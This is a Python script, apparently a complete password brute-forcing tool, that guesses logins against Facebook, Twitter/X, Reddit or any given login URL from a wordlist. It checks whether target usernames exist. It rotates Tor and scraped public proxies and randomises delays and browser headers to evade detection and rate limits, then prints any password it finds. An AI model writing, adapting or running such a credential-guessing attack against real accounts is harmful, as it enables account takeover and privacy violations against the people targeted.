from proxyscrape import create_collector, get_collector
import time
import requests
import argparse
import os
from requests.exceptions import RequestException, Timeout
import sys
import random

avoidance_patterns = [
    r"^[0-9]+$",  # Avoid using all numeric passwords
    r"^[a-zA-Z]+$",  # Avoid using all alphabetic passwords
    r"^[a-zA-Z0-9]+$",  # Avoid using alphanumeric patterns
    # добавить больше шаблонов
]

proxies = [
    "http://1.1.1.1:8080",
    "http://2.2.2.2:8080",
    # прокси
]

class Bruter:
    def __init__(self, service, username, wordlist, delay, fb_name=None, verbose=False):
        self.service = service
        self.username = username
        self.wordlist = wordlist
        self.delay = delay
        self.fb_name = fb_name
        self.session = requests.Session()
        self.verbose = verbose
        self.start_time = time.time()
        self.attempts = 0
        self.proxies = [
            "socks5://127.0.0.1:9050",  # TOR
            "http://127.0.0.1:8080",    # HTTP
        ]

        try:
            collector = create_collector('my_collector', ['http', 'https'])
            proxy_list = collector.get_proxies()
            if proxy_list:
                self.proxies.extend([f"http://{proxy.host}:{proxy.port}" for proxy in proxy_list])
        except Exception as e:
            if self.verbose:
                print(f"[Warning] Error loading proxies: {str(e)}")
            print("[*] Using default proxy configuration")

        self.service_configs = {
            'facebook': {
                'url': 'https://www.facebook.com/login',
                'data': lambda u, p: {'email': u, 'pass': p},
                'success': lambda r: 'c_user' in r.cookies
            },
            'twitter': {
                'url': 'https://x.com/i/flow/login',
                'data': lambda u, p: {'username': u, 'password': p},
                'success': lambda r: 'auth_token' in r.cookies
            },
            'reddit': {
                'url': 'https://www.reddit.com/login',
                'data': lambda u, p: {'user': u, 'passwd': p},
                'success': lambda r: 'reddit_session' in r.cookies
            }
        }

    def usercheck(self, username):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
            }

            if self.service.startswith('http'):
                return 0

            if self.service == "facebook":
                if self.fb_name:
                    r = self.session.get(f"https://www.facebook.com/public/{self.fb_name}", headers=headers)
                    return 0 if "We couldn't find anything" not in r.text else 1
                return 0

            elif self.service == "twitter":
                r = self.session.get(f"https://x.com/{username}", headers=headers)
                return 0 if r.status_code != 404 else 1

            elif self.service == "reddit":
                r = self.session.get(f"https://www.reddit.com/user/{username}/about.json", headers=headers)
                return 0 if r.status_code != 404 else 1

            elif self.service in self.service_configs:
                return 0
            return 0
        except RequestException as e:
            print(f"[Warning] Error checking username: {str(e)}")
            return 0

    def get_random_proxy(self):
        try:
            proxy = random.choice(self.proxies)
            return {
                'http': proxy,
                'https': proxy
            }
        except IndexError:
            if self.verbose:
                print("[Warning] No proxies available, continuing without proxy")
            return None


    def webBruteforce(self, username, wordlist, service, delay):
        if service.startswith('http'):
            target_url = service
            is_custom = True
        else:
            if service not in self.service_configs:
                print(f"[Error] Unsupported service: {service}")
                print("Available services:", ', '.join(self.service_configs.keys()))
                print("Or use full URL (e.g., https://example.com/login)")
                exit(1)
            target_url = self.service_configs[service]['url']
            is_custom = False

        with open(wordlist, "r") as f:
            passwords = f.readlines()
            total_passwords = len(passwords)

            for password in passwords:
                self.attempts += 1
                password = password.strip()

                # bar
                progress = int((self.attempts / total_passwords) * 30)
                sys.stdout.write('\r\033[K')
                sys.stdout.write(
                    f"\033[96m[{'=' * progress}{' ' * (30 - progress)}] {self.attempts}/{total_passwords}\033[0m")
                sys.stdout.flush()

                try:
                    proxies = self.get_random_proxy()
                    time.sleep(random.uniform(delay, delay * 2))

                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': target_url,
                        'Connection': 'keep-alive',
                    }

                    if is_custom:
                        data = {
                            'username': username,
                            'email': username,
                            'user': username,
                            'password': password,
                            'pass': password,
                            'passwd': password
                        }
                    else:
                        data = self.service_configs[service]['data'](username, password)

                    r = self.session.post(
                        target_url,
                        data=data,
                        headers=headers,
                        proxies=proxies if proxies else None,
                        allow_redirects=True,
                        timeout=10
                    )

                    print(f"HTTP {r.status_code} | Password: {password} | Size: {len(r.text):,} bytes\033[0m")

                    if 'location' in r.headers:
                        print(f"\033[94m[→] Redirect: {r.headers['location']}\033[0m")

                    if is_custom:
                        success = any([
                            'dashboard' in r.url,
                            'welcome' in r.url,
                            'home' in r.url,
                            'success' in r.text.lower(),
                            'welcome' in r.text.lower(),
                            r.status_code == 302
                        ])
                    else:
                        success = self.service_configs[service]['success'](r)

                    if success:
                        print(f"""
                    \033[92m╔══════════════════ SUCCESS ══════════════════╗
                    ║ Password Found!                              ║
                    ║ Username: {username:<35} ║
                    ║ Password: {password:<35} ║
                    ║ Attempts: {self.attempts:<35} ║
                    ║ Time: {time.time() - self.start_time:.2f} seconds{' ' * 27} ║
                    ╚═════════════════════════════════════════════╝\033[0m
                                            """)
                        return True
                except RequestException as e:
                    print(f"\n\033[91m[✗] Error: {str(e)} | Password: {password}\033[0m")
                    if proxies:
                        print(f"\033[91m[!] Failed Proxy: {proxies['http']}\033[0m")
                    continue
        return False

    def execute(self):
        if self.usercheck(self.username) == 1:
            print(f"[Error] Username '{self.username}' does not exist")
            exit(1)

        if self.service.startswith('http'):
            print("[*] Custom URL: Skipping username check")
        else:
            print(f"[+] Username '{self.username}' found")

        self.webBruteforce(self.username, self.wordlist, self.service, self.delay)

def main():
    parser = argparse.ArgumentParser(
        description="Тестовое задание Ецин"
    )
    required = parser.add_argument_group("required arguments")
    required.add_argument("-s", "--service", dest="service", required=True,
                          help="Service name (facebook, etc.) or full URL")
    required.add_argument("-u", "--username", dest="username", required=True)
    required.add_argument("-w", "--wordlist", dest="password", required=True)
    parser.add_argument("-d", "--delay", type=int, dest="delay", default=1,
                        help="Delay between attempts (default: 1)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show detailed output for each attempt")

    args = parser.parse_args()

    service = args.service
    username = args.username
    wordlist = args.password
    delay = args.delay or 1
    fb_name = None

    if not os.path.exists(wordlist):
        print("[Error] Wordlist not found")
        exit(1)

    if service == "facebook":
        fb_name = input("Please Enter the Name of the Facebook Account: ")
        os.system("clear")

    br = Bruter(service, username, wordlist, delay, fb_name=fb_name, verbose=args.verbose)
    br.execute()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[91m[!] Operation cancelled by user\033[0m")
        os.system("rm -rf tmp/")
        exit(1)